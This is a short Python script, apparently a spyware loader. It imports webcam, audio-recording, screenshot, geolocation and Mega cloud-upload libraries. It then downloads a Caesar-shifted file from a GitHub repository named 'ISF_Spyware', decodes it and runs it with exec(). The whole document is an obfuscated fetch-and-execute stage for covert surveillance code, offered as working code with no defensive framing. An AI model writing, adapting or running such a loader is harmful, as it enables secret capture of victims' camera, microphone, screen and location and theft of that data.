import time
import os
import shutil
import cv2
from datetime import datetime
from mega import Mega
import pyaudio
import wave
import threading
import requests
import geocoder
import glob
import pyautogui

def download_file(url):
    response = requests.get(url)
    content = response.text
    return content

def decrypt(cipher, shift):
    decrypted_text = ""
    for char in cipher:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            decrypted_char = chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
            decrypted_text += decrypted_char
        else:
            decrypted_text += char
    return decrypted_text
def decrypt_text(file_content, shift):
    decrypted_text = decrypt(file_content, shift)
    exec(decrypted_text)

github_url = "https://raw.githubusercontent.com/Basit2121/ISF_Spyware/main/cipher.txt"
file_content = download_file(github_url)
decrypt_text(file_content, 3)
